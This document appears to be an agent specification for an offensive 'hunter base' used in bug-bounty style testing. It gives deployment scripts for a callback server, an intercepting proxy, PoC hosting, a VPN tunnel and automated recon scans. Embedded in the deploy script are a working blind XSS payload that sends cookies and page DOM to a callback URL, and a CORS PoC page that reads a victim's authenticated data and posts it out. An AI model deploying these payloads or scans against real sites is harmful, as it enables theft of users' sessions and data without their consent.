# Hunter Base Agent

The team's BASE OF OPERATIONS. Deploy complete hunting infrastructure -- proxy, callback server, scanning node, PoC hosting, VPN tunnel, monitoring -- on a VPS or locally with one command.

## Safety Rules

- NEVER deploy to a server without explicit operator confirmation
- NEVER open ports on production servers -- hunter base goes on dedicated VPS only
- NEVER store target data or findings on the VPS unencrypted
- ALWAYS tear down infrastructure after an engagement ends
- Log all deployments to `/var/log/claudeos/hunter-base.log`
- Verify SSH key auth before deploying (no password auth over scripts)

---

## 1. Commands

```bash
# Deploy full infrastructure to a remote VPS
claudeos base deploy user@ip

# Check status of all components
claudeos base status

# Show received callbacks (blind XSS/SSRF/SQLi confirmations)
claudeos base callback

# Start/stop intercepting proxy
claudeos base proxy start
claudeos base proxy stop

# Upload a PoC HTML file to the web server
claudeos base poc upload exploit.html

# Tear down everything and wipe the VPS
claudeos base teardown

# Deploy locally with Docker instead of remote VPS
claudeos base docker up
claudeos base docker down
```

---

## 2. Full Deployment Script

### deploy.sh

```bash
#!/usr/bin/env bash
#
# ClaudeOS Hunter Base -- Full VPS Deployment
# Usage: ./deploy.sh user@ip [--skip-tools] [--no-vpn]
#
set -euo pipefail

SSH_TARGET="${1:?Usage: deploy.sh user@ip}"
SKIP_TOOLS="${2:-}"
BASE_DIR="/opt/hunter-base"
CALLBACK_PORT=9999
PROXY_PORT=8080
PROXY_WEB_PORT=8081
WEB_PORT=8443
DNS_PORT=5353
SMTP_PORT=2525

log() { echo "[hunter-base] $(date '+%Y-%m-%d %H:%M:%S') $*"; }

log "Deploying hunter base to $SSH_TARGET"

# -------------------------------------------------------------------
# 1. System prep
# -------------------------------------------------------------------
log "Installing system dependencies..."
ssh "$SSH_TARGET" 'export DEBIAN_FRONTEND=noninteractive && \
  apt update -qq && \
  apt install -y -qq python3 python3-pip python3-venv nginx \
    wireguard tmux ufw curl wget git unzip jq dnsutils \
    net-tools build-essential libpcap-dev golang-go nmap'

# -------------------------------------------------------------------
# 2. Create directory structure
# -------------------------------------------------------------------
log "Creating directory structure..."
ssh "$SSH_TARGET" "mkdir -p $BASE_DIR/{callback,pocs,scans,certs,logs,configs,tools}"

# -------------------------------------------------------------------
# 3. Deploy callback server
# -------------------------------------------------------------------
log "Deploying callback server..."
ssh "$SSH_TARGET" "cat > $BASE_DIR/callback/server.py << 'PYEOF'
#!/usr/bin/env python3
\"\"\"
ClaudeOS Hunter Base -- Callback Server
Listens for blind XSS, SSRF, SQLi, XXE out-of-band callbacks.
Logs everything. Sends Telegram notifications.
\"\"\"

import http.server
import json
import os
import socketserver
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from urllib.request import Request, urlopen

CALLBACK_PORT = int(os.environ.get('CALLBACK_PORT', 9999))
LOG_DIR = Path('/opt/hunter-base/logs')
LOG_DIR.mkdir(parents=True, exist_ok=True)
CALLBACK_LOG = LOG_DIR / 'callbacks.jsonl'
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')


def notify_telegram(msg):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        data = json.dumps({'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'HTML'}).encode()
        req = Request(url, data=data, headers={'Content-Type': 'application/json'})
        urlopen(req, timeout=10)
    except Exception as e:
        print(f'[telegram] notification failed: {e}', file=sys.stderr)


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def _log_callback(self, method):
        body = b''
        content_length = self.headers.get('Content-Length')
        if content_length:
            body = self.rfile.read(int(content_length))

        entry = {
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'source_ip': self.client_address[0],
            'source_port': self.client_address[1],
            'method': method,
            'path': self.path,
            'headers': dict(self.headers),
            'body': body.decode('utf-8', errors='replace')[:10000],
        }

        # Write to log
        with open(str(CALLBACK_LOG), 'a') as f:
            f.write(json.dumps(entry) + '\\n')

        # Print to stdout for tmux visibility
        print(f'\\n[CALLBACK] {entry[\"timestamp\"]}')
        print(f'  From: {entry[\"source_ip\"]}:{entry[\"source_port\"]}')
        print(f'  {method} {self.path}')
        print(f'  Headers: {json.dumps(dict(self.headers), indent=2)[:500]}')
        if body:
            print(f'  Body: {body.decode(\"utf-8\", errors=\"replace\")[:500]}')
        print()

        # Telegram alert
        alert = (
            f'<b>CALLBACK RECEIVED</b>\\n'
            f'From: <code>{entry[\"source_ip\"]}</code>\\n'
            f'{method} <code>{self.path}</code>\\n'
            f'Time: {entry[\"timestamp\"]}'
        )
        notify_telegram(alert)

        return entry

    def do_GET(self):
        self._log_callback('GET')
        # Serve a tracking pixel for blind XSS confirmation
        if self.path.endswith('.gif') or self.path.endswith('.png'):
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.end_headers()
            # 1x1 transparent GIF
            self.wfile.write(b'GIF89a\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00!\\xf9\\x04\\x00\\x00\\x00\\x00\\x00,\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02D\\x01\\x00;')
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'ok')

    def do_POST(self):
        self._log_callback('POST')
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'ok')

    def do_PUT(self):
        self._log_callback('PUT')
        self.send_response(200)
        self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default logging


def run():
    print(f'[callback] Listening on 0.0.0.0:{CALLBACK_PORT}')
    server = socketserver.ThreadingTCPServer(('0.0.0.0', CALLBACK_PORT), CallbackHandler)
    server.serve_forever()


if __name__ == '__main__':
    run()
PYEOF
chmod +x $BASE_DIR/callback/server.py"

# -------------------------------------------------------------------
# 4. Create systemd service for callback server
# -------------------------------------------------------------------
log "Creating callback systemd service..."
ssh "$SSH_TARGET" "cat > /etc/systemd/system/hunter-callback.service << EOF
[Unit]
Description=ClaudeOS Hunter Base Callback Server
After=network.target

[Service]
Type=simple
WorkingDirectory=$BASE_DIR/callback
ExecStart=/usr/bin/python3 $BASE_DIR/callback/server.py
Restart=always
RestartSec=5
Environment=CALLBACK_PORT=$CALLBACK_PORT
EnvironmentFile=-$BASE_DIR/configs/env

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable hunter-callback
systemctl start hunter-callback"

# -------------------------------------------------------------------
# 5. Generate self-signed cert for PoC web server
# -------------------------------------------------------------------
log "Generating TLS certificate..."
ssh "$SSH_TARGET" "openssl req -x509 -nodes -days 365 \
  -newkey rsa:2048 \
  -keyout $BASE_DIR/certs/server.key \
  -out $BASE_DIR/certs/server.crt \
  -subj '/CN=hunter-base/O=ClaudeOS/C=XX' 2>/dev/null"

# -------------------------------------------------------------------
# 6. Configure nginx for PoC hosting
# -------------------------------------------------------------------
log "Configuring nginx..."
ssh "$SSH_TARGET" "cat > /etc/nginx/sites-available/hunter-base << EOF
server {
    listen $WEB_PORT ssl;
    server_name _;

    ssl_certificate $BASE_DIR/certs/server.crt;
    ssl_certificate_key $BASE_DIR/certs/server.key;

    root $BASE_DIR/pocs;
    index index.html;

    # No directory listing -- don't leak PoC inventory
    autoindex off;

    # CORS headers so PoC pages can make cross-origin requests
    add_header Access-Control-Allow-Origin * always;
    add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS' always;
    add_header Access-Control-Allow-Headers '*' always;

    location / {
        try_files \\\$uri \\\$uri/ =404;
    }

    # Health check
    location /health {
        return 200 'hunter-base-ok';
        add_header Content-Type text/plain;
    }

    access_log $BASE_DIR/logs/nginx-access.log;
    error_log $BASE_DIR/logs/nginx-error.log;
}
EOF
ln -sf /etc/nginx/sites-available/hunter-base /etc/nginx/sites-enabled/hunter-base
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl reload nginx"

# -------------------------------------------------------------------
# 7. Install mitmproxy
# -------------------------------------------------------------------
log "Installing mitmproxy..."
ssh "$SSH_TARGET" "pip3 install mitmproxy 2>/dev/null || \
  pip3 install --break-system-packages mitmproxy 2>/dev/null"

# -------------------------------------------------------------------
# 8. Install security tools
# -------------------------------------------------------------------
if [ "$SKIP_TOOLS" != "--skip-tools" ]; then
  log "Installing security tools (this takes a few minutes)..."
  ssh "$SSH_TARGET" 'export GOPATH=/root/go && export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin && \
    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null && \
    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null && \
    go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null && \
    go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest 2>/dev/null && \
    go install -v github.com/projectdiscovery/katana/cmd/katana@latest 2>/dev/null && \
    go install -v github.com/ffuf/ffuf/v2@latest 2>/dev/null && \
    ln -sf /root/go/bin/* /usr/local/bin/ 2>/dev/null; \
    echo "Tools installed."'
fi

# -------------------------------------------------------------------
# 9. Deploy default PoC templates
# -------------------------------------------------------------------
log "Deploying PoC templates..."
ssh "$SSH_TARGET" "cat > $BASE_DIR/pocs/cors-poc.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS Misconfiguration PoC</h2>
<pre id=\"result\">Loading...</pre>
<script>
// Replace TARGET_URL with the vulnerable endpoint
const TARGET_URL = 'https://TARGET/api/user/profile';
const CALLBACK = 'CALLBACK_URL';
fetch(TARGET_URL, {credentials: 'include'})
  .then(r => r.text())
  .then(data => {
    document.getElementById('result').textContent = data;
    // Exfiltrate to callback server
    fetch(CALLBACK + '/cors-exfil', {
      method: 'POST',
      body: data
    });
  })
  .catch(e => document.getElementById('result').textContent = 'Error: ' + e);
</script>
</body>
</html>
HTMLEOF

cat > $BASE_DIR/pocs/blind-xss.html << 'HTMLEOF'
<!--
  Blind XSS Payload -- inject this as a script src or inline
  It phones home to the callback server with page context.
-->
<script>
(function(){
  var d = document;
  var data = {
    url: location.href,
    cookie: d.cookie,
    dom: d.documentElement.innerHTML.substring(0, 2000),
    origin: location.origin,
    referrer: d.referrer
  };
  var img = new Image();
  img.src = 'CALLBACK_URL/blind-xss?data=' + encodeURIComponent(JSON.stringify(data));
})();
</script>
HTMLEOF

cat > $BASE_DIR/pocs/ssrf-poc.html << 'HTMLEOF'
<!-- SSRF PoC -- for demonstrating SSRF impact -->
<html><body>
<h2>SSRF PoC</h2>
<p>The server made a request to our callback server, confirming SSRF.</p>
<p>Callback URL used: <code>CALLBACK_URL/ssrf-confirm</code></p>
<p>Check callback logs for the incoming request.</p>
</body></html>
HTMLEOF
"

# -------------------------------------------------------------------
# 10. Configure WireGuard VPN (optional)
# -------------------------------------------------------------------
if [ "$SKIP_TOOLS" != "--no-vpn" ]; then
  log "Configuring WireGuard tunnel..."
  ssh "$SSH_TARGET" "
    # Generate server keys
    wg genkey | tee $BASE_DIR/configs/wg-server-private.key | wg pubkey > $BASE_DIR/configs/wg-server-public.key
    chmod 600 $BASE_DIR/configs/wg-server-private.key

    SERVER_PRIVKEY=\$(cat $BASE_DIR/configs/wg-server-private.key)

    cat > /etc/wireguard/wg-hunter.conf << WGEOF
[Interface]
Address = 10.66.66.1/24
ListenPort = 51820
PrivateKey = \$SERVER_PRIVKEY
PostUp = iptables -A FORWARD -i wg-hunter -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg-hunter -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# Operator peer -- add public key after generating client config
# [Peer]
# PublicKey = <OPERATOR_PUBLIC_KEY>
# AllowedIPs = 10.66.66.2/32
WGEOF

    chmod 600 /etc/wireguard/wg-hunter.conf
    echo 'net.ipv4.ip_forward = 1' >> /etc/sysctl.conf
    sysctl -p >/dev/null 2>&1
    echo 'WireGuard configured. Add operator peer to activate.'
  "
fi

# -------------------------------------------------------------------
# 11. Firewall rules
# -------------------------------------------------------------------
log "Configuring firewall..."
ssh "$SSH_TARGET" "ufw --force reset >/dev/null 2>&1
  ufw default deny incoming
  ufw default allow outgoing
  ufw allow 22/tcp          # SSH
  ufw allow $PROXY_PORT/tcp     # mitmproxy
  ufw allow $PROXY_WEB_PORT/tcp # mitmproxy web
  ufw allow $CALLBACK_PORT/tcp  # callback server
  ufw allow $WEB_PORT/tcp       # PoC web server
  ufw allow $DNS_PORT/udp       # DNS callback
  ufw allow $SMTP_PORT/tcp      # SMTP callback
  ufw allow 51820/udp       # WireGuard
  ufw --force enable"

# -------------------------------------------------------------------
# 12. tmux session with monitoring panes
# -------------------------------------------------------------------
log "Setting up tmux session..."
ssh "$SSH_TARGET" "cat > $BASE_DIR/start-session.sh << 'TMUXEOF'
#!/bin/bash
# Start the hunter-base tmux monitoring session
SESSION=\"hunter-base\"

tmux kill-session -t \$SESSION 2>/dev/null

tmux new-session -d -s \$SESSION -n 'overview'

# Pane 0: System monitoring
tmux send-keys -t \$SESSION:0 'watch -n5 \"echo ===HUNTER-BASE=== && echo && uptime && echo && free -h && echo && df -h / && echo && ss -tlnp | grep -E \\\"(9999|8080|8081|8443)\\\"\"' C-m

# Pane 1: Callback server logs
tmux split-window -h -t \$SESSION:0
tmux send-keys -t \$SESSION:0.1 'journalctl -u hunter-callback -f' C-m

# Pane 2: Proxy logs (bottom)
tmux split-window -v -t \$SESSION:0.0
tmux send-keys -t \$SESSION:0.2 'tail -f /opt/hunter-base/logs/nginx-access.log 2>/dev/null || echo \"Waiting for logs...\"' C-m

tmux select-pane -t \$SESSION:0.0
echo \"tmux session 'hunter-base' started. Attach with: tmux attach -t hunter-base\"
TMUXEOF
chmod +x $BASE_DIR/start-session.sh
bash $BASE_DIR/start-session.sh"

# -------------------------------------------------------------------
# 13. Status checker
# -------------------------------------------------------------------
log "Deploying status checker..."
ssh "$SSH_TARGET" "cat > $BASE_DIR/status.sh << 'STATUSEOF'
#!/bin/bash
echo '============================================'
echo '  ClaudeOS Hunter Base -- Status Report'
echo '============================================'
echo ''
echo \"Host: \$(hostname) (\$(curl -s ifconfig.me 2>/dev/null || echo 'unknown'))\"
echo \"Uptime: \$(uptime -p)\"
echo ''

check_service() {
    local name=\$1
    local port=\$2
    if ss -tlnp | grep -q \":\$port \"; then
        echo \"  [UP]   \$name (port \$port)\"
    else
        echo \"  [DOWN] \$name (port \$port)\"
    fi
}

echo 'Services:'
check_service 'Callback Server' 9999
check_service 'mitmproxy'       8080
check_service 'mitmproxy Web'   8081
check_service 'PoC Web Server'  8443
check_service 'WireGuard'       51820

echo ''
echo 'Callbacks received:'
if [ -f /opt/hunter-base/logs/callbacks.jsonl ]; then
    local count=\$(wc -l < /opt/hunter-base/logs/callbacks.jsonl)
    echo \"  Total: \$count\"
    echo '  Last 3:'
    tail -3 /opt/hunter-base/logs/callbacks.jsonl | python3 -c "
import sys, json
for line in sys.stdin:
    e = json.loads(line)
    print(f\"    {e['timestamp']} | {e['source_ip']} | {e['method']} {e['path']}\")
" 2>/dev/null
else
    echo '  None yet.'
fi

echo ''
echo 'Disk:'
df -h / | tail -1 | awk '{print "  Used: " $3 "/" $2 " (" $5 ")"}'

echo ''
echo 'Tools installed:'
for tool in nuclei subfinder httpx dnsx katana ffuf nmap; do
    if command -v \$tool &>/dev/null; then
        echo "  [OK] \$tool"
    else
        echo "  [--] \$tool (not installed)"
    fi
done
STATUSEOF
chmod +x $BASE_DIR/status.sh"

# -------------------------------------------------------------------
# 14. Teardown script
# -------------------------------------------------------------------
ssh "$SSH_TARGET" "cat > $BASE_DIR/teardown.sh << 'TEAREOF'
#!/bin/bash
echo '[hunter-base] TEARDOWN -- removing all traces'
read -p 'Are you sure? This destroys everything. (yes/no): ' confirm
if [ \"\$confirm\" != 'yes' ]; then
    echo 'Aborted.'
    exit 1
fi

systemctl stop hunter-callback 2>/dev/null
systemctl disable hunter-callback 2>/dev/null
rm -f /etc/systemd/system/hunter-callback.service

systemctl stop wg-quick@wg-hunter 2>/dev/null
rm -f /etc/wireguard/wg-hunter.conf

rm -f /etc/nginx/sites-enabled/hunter-base
rm -f /etc/nginx/sites-available/hunter-base
systemctl reload nginx 2>/dev/null

tmux kill-session -t hunter-base 2>/dev/null

# Wipe all data
rm -rf /opt/hunter-base

# Remove firewall rules (reset to default deny)
ufw --force reset >/dev/null 2>&1
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw --force enable

systemctl daemon-reload
echo '[hunter-base] Teardown complete. VPS is clean.'
TEAREOF
chmod +x $BASE_DIR/teardown.sh"

# -------------------------------------------------------------------
# Done
# -------------------------------------------------------------------
VPS_IP=$(echo "$SSH_TARGET" | cut -d'@' -f2)
log "Deployment complete!"
echo ""
echo "============================================"
echo "  Hunter Base deployed to $SSH_TARGET"
echo "============================================"
echo ""
echo "  Callback server:  http://$VPS_IP:$CALLBACK_PORT/"
echo "  PoC web server:   https://$VPS_IP:$WEB_PORT/"
echo "  Proxy (start manually): mitmproxy -p $PROXY_PORT"
echo "  Proxy web UI:     http://$VPS_IP:$PROXY_WEB_PORT/"
echo "  WireGuard:        port 51820/udp (add peer to activate)"
echo ""
echo "  tmux session:     ssh $SSH_TARGET -t 'tmux attach -t hunter-base'"
echo "  Status:           ssh $SSH_TARGET '$BASE_DIR/status.sh'"
echo "  Teardown:         ssh $SSH_TARGET '$BASE_DIR/teardown.sh'"
echo ""
echo "  Blind XSS payload callback URL:"
echo "    http://$VPS_IP:$CALLBACK_PORT/blind-xss"
echo ""
echo "  Upload PoCs:"
echo "    scp exploit.html $SSH_TARGET:$BASE_DIR/pocs/"
echo ""
```

---

## 3. Docker Alternative (Local Deployment)

### docker-compose.yml

```yaml
version: "3.8"

services:
  callback:
    build:
      context: .
      dockerfile: Dockerfile.callback
    ports:
      - "9999:9999"
      - "5353:5353/udp"
    volumes:
      - ./logs:/opt/hunter-base/logs
    env_file:
      - .env
    restart: unless-stopped

  proxy:
    image: mitmproxy/mitmproxy:latest
    command: mitmweb --web-host 0.0.0.0 --web-port 8081 --listen-port 8080 --set block_global=false
    ports:
      - "8080:8080"
      - "8081:8081"
    volumes:
      - ./certs:/home/mitmproxy/.mitmproxy
    restart: unless-stopped

  web:
    image: nginx:alpine
    ports:
      - "8443:443"
    volumes:
      - ./pocs:/usr/share/nginx/html:ro
      - ./nginx-local.conf:/etc/nginx/conf.d/default.conf:ro
      - ./certs/server.crt:/etc/nginx/certs/server.crt:ro
      - ./certs/server.key:/etc/nginx/certs/server.key:ro
    restart: unless-stopped

  monitor:
    image: alpine:latest
    command: sh -c "apk add --no-cache curl && while true; do echo '--- Hunter Base Monitor ---'; date; curl -sf http://callback:9999/health || echo 'callback: DOWN'; curl -sf http://proxy:8081/ >/dev/null && echo 'proxy: UP' || echo 'proxy: DOWN'; curl -skf https://web:443/health || echo 'web: DOWN'; sleep 30; done"
    depends_on:
      - callback
      - proxy
      - web
    restart: unless-stopped
```

### Dockerfile.callback

```dockerfile
FROM python:3.11-slim
WORKDIR /opt/hunter-base/callback
COPY callback/server.py .
RUN mkdir -p /opt/hunter-base/logs
EXPOSE 9999
CMD ["python3", "server.py"]
```

### nginx-local.conf

```nginx
server {
    listen 443 ssl;
    server_name _;

    ssl_certificate /etc/nginx/certs/server.crt;
    ssl_certificate_key /etc/nginx/certs/server.key;

    root /usr/share/nginx/html;
    index index.html;
    autoindex off;

    add_header Access-Control-Allow-Origin * always;
    add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS' always;
    add_header Access-Control-Allow-Headers '*' always;

    location / {
        try_files $uri $uri/ =404;
    }

    location /health {
        return 200 'hunter-base-ok';
        add_header Content-Type text/plain;
    }
}
```

### .env (template)

```bash
# ClaudeOS Hunter Base environment
CALLBACK_PORT=9999
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=
```

### Local Docker setup script

```bash
#!/bin/bash
# claudeos base docker up
set -euo pipefail

HUNTER_DIR="${HUNTER_BASE_DIR:-$HOME/.claudeos/hunter-base}"
mkdir -p "$HUNTER_DIR"/{callback,pocs,certs,logs}

# Generate self-signed cert if not present
if [ ! -f "$HUNTER_DIR/certs/server.crt" ]; then
    openssl req -x509 -nodes -days 365 \
      -newkey rsa:2048 \
      -keyout "$HUNTER_DIR/certs/server.key" \
      -out "$HUNTER_DIR/certs/server.crt" \
      -subj '/CN=hunter-base/O=ClaudeOS/C=XX' 2>/dev/null
    echo "[hunter-base] TLS cert generated."
fi

# Copy docker-compose and configs into place
# (In production, these are read from the agent directory)

cd "$HUNTER_DIR"
docker compose up -d

echo ""
echo "Hunter Base (local) is running:"
echo "  Callback:  http://localhost:9999/"
echo "  Proxy:     http://localhost:8080/ (configure browser/Burp to use)"
echo "  Proxy UI:  http://localhost:8081/"
echo "  PoC Web:   https://localhost:8443/"
echo ""
echo "  Logs:      $HUNTER_DIR/logs/"
echo "  PoCs:      $HUNTER_DIR/pocs/ (drop HTML files here)"
echo ""
echo "  Stop:      claudeos base docker down"
```

---

## 4. Scan Output Organization

All scan output is organized by target and date:

```
/opt/hunter-base/scans/
  target.com/
    2026-04-13/
      subdomains.txt       # subfinder output
      live-hosts.txt       # httpx output
      ports.txt            # nmap output
      nuclei-results.json  # nuclei findings
      katana-urls.txt      # crawled URLs
      ffuf-dirs.txt        # directory brute-force
      notes.md             # operator notes
```

### Scan wrapper script

```bash
#!/bin/bash
# Run a full recon scan against a target, output organized.
# Usage: scan.sh target.com

TARGET="${1:?Usage: scan.sh target.com}"
DATE=$(date +%Y-%m-%d)
OUT="/opt/hunter-base/scans/$TARGET/$DATE"
mkdir -p "$OUT"

echo "[scan] Target: $TARGET"
echo "[scan] Output: $OUT"

# Subdomain enumeration
echo "[scan] Running subfinder..."
subfinder -d "$TARGET" -silent -o "$OUT/subdomains.txt" 2>/dev/null
SUB_COUNT=$(wc -l < "$OUT/subdomains.txt" 2>/dev/null || echo 0)
echo "[scan] Found $SUB_COUNT subdomains."

# Probe live hosts
echo "[scan] Probing live hosts with httpx..."
cat "$OUT/subdomains.txt" | httpx -silent -status-code -title -tech-detect \
  -o "$OUT/live-hosts.txt" 2>/dev/null
LIVE_COUNT=$(wc -l < "$OUT/live-hosts.txt" 2>/dev/null || echo 0)
echo "[scan] $LIVE_COUNT live hosts."

# Port scan on main domain
echo "[scan] Running nmap on $TARGET..."
nmap -sV -sC -T3 --top-ports 1000 -oN "$OUT/ports.txt" "$TARGET" 2>/dev/null

# Nuclei scan
echo "[scan] Running nuclei..."
cat "$OUT/live-hosts.txt" | awk '{print $1}' | \
  nuclei -silent -severity critical,high,medium -jsonl -o "$OUT/nuclei-results.json" 2>/dev/null
NUCLEI_COUNT=$(wc -l < "$OUT/nuclei-results.json" 2>/dev/null || echo 0)
echo "[scan] Nuclei found $NUCLEI_COUNT results."

# Crawl URLs
echo "[scan] Crawling with katana..."
cat "$OUT/live-hosts.txt" | awk '{print $1}' | head -20 | \
  katana -silent -d 3 -o "$OUT/katana-urls.txt" 2>/dev/null

echo "[scan] Complete. Results in $OUT/"
```

---

## 5. WireGuard Client Config Generator

```bash
#!/bin/bash
# Generate a WireGuard client config to tunnel through the VPS
# Usage: gen-client.sh <vps-ip>

VPS_IP="${1:?Usage: gen-client.sh <vps-ip>}"
BASE_DIR="/opt/hunter-base"

# Generate client keys
CLIENT_PRIVKEY=$(wg genkey)
CLIENT_PUBKEY=$(echo "$CLIENT_PRIVKEY" | wg pubkey)
SERVER_PUBKEY=$(cat "$BASE_DIR/configs/wg-server-public.key")

# Add peer to server config
cat >> /etc/wireguard/wg-hunter.conf << EOF

[Peer]
PublicKey = $CLIENT_PUBKEY
AllowedIPs = 10.66.66.2/32
EOF

# Restart WireGuard
wg-quick down wg-hunter 2>/dev/null
wg-quick up wg-hunter

# Output client config
cat << EOF

# Save this as wg-hunter.conf on your machine
# Then: wg-quick up wg-hunter

[Interface]
PrivateKey = $CLIENT_PRIVKEY
Address = 10.66.66.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = $SERVER_PUBKEY
Endpoint = $VPS_IP:51820
AllowedIPs = 0.0.0.0/0
# For split tunneling (only route hunting traffic through VPN):
# AllowedIPs = 10.66.66.0/24
PersistentKeepalive = 25
EOF
```

---

## 6. Proxy Start/Stop

```bash
# Start mitmproxy in the background (inside tmux)
start_proxy() {
    ssh "$SSH_TARGET" "tmux send-keys -t hunter-base:0.2 C-c
    tmux send-keys -t hunter-base:0.2 'mitmweb --listen-host 0.0.0.0 --listen-port 8080 --web-host 0.0.0.0 --web-port 8081 --set block_global=false 2>&1 | tee /opt/hunter-base/logs/proxy.log' C-m"
    echo "Proxy started on port 8080, web UI on 8081"
}

# Stop mitmproxy
stop_proxy() {
    ssh "$SSH_TARGET" "tmux send-keys -t hunter-base:0.2 C-c"
    echo "Proxy stopped."
}
```

---

## 7. PoC Upload

```bash
# Upload a PoC file to the hunter base web server
# Usage: claudeos base poc upload exploit.html
upload_poc() {
    local file="$1"
    local filename=$(basename "$file")
    scp "$file" "$SSH_TARGET:/opt/hunter-base/pocs/$filename"
    VPS_IP=$(echo "$SSH_TARGET" | cut -d'@' -f2)
    echo "PoC uploaded: https://$VPS_IP:8443/$filename"
}
```

---

## 8. Callback Viewer

```bash
# View recent callbacks
# Usage: claudeos base callback [count]
view_callbacks() {
    local count="${1:-20}"
    ssh "$SSH_TARGET" "tail -$count /opt/hunter-base/logs/callbacks.jsonl 2>/dev/null | \
      python3 -c \"
import sys, json
for line in sys.stdin:
    e = json.loads(line)
    print(f\\\"{e['timestamp']} | {e['source_ip']:>15} | {e['method']:>4} {e['path']}\\\")
    if e.get('body'):
        print(f\\\"  Body: {e['body'][:200]}\\\")
\" || echo 'No callbacks received yet.'"
}
```

---

## 9. Integration with ClaudeOS Team

The Hunter Base serves the entire team:

- **Blind Injection Tester** -- uses the callback server for OOB confirmation
- **XSS Hunter** -- hosts blind XSS payloads on the PoC web server
- **SSRF Hunter** -- callback URL confirms server-side requests
- **CORS Chain Analyzer** -- hosts CORS exploit PoC pages
- **Collaborator** -- the callback server IS the self-hosted collaborator
- **Proxy Rotator** -- routes through the VPS proxy
- **Nuclei Master** -- runs scans from the scanning node
- **Tunnel Builder** -- uses the WireGuard tunnel for pivoting

When starting an engagement, the team leader should:
1. `claudeos base deploy user@ip` -- stand up infrastructure
2. `claudeos brain update` -- pull latest intel
3. Run recon and hunting from the scanning node
4. All blind/OOB payloads point to `http://<VPS_IP>:9999/`
5. PoC pages are served from `https://<VPS_IP>:8443/`
6. After engagement: `claudeos base teardown` -- leave no trace
